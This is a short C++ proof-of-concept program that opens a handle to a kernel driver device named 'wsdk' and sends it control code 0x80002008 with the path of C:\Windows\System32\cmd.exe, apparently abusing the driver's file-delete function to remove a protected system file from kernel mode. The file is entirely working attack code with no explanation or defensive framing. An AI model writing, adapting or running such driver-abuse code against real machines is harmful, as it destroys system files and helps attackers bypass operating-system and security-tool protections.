#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\wsdk"

HANDLE hDevice;

struct DATA_80002008
{
    int padding;
    WCHAR filename[0x100];
};

void DeleteFile_80002008()
{
    DWORD dwWrite;
    DATA_80002008 data;
    data.padding = 0;
    WCHAR filename[0x200] = L"\\??\\C:\\Windows\\System32\\cmd.exe\0";
    memset(data.filename, 0, 0x200);
    memcpy(data.filename, filename, 0x200);
    DeviceIoControl(hDevice, 0x80002008, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    DeleteFile_80002008();

    system("pause");
    return 0;
}
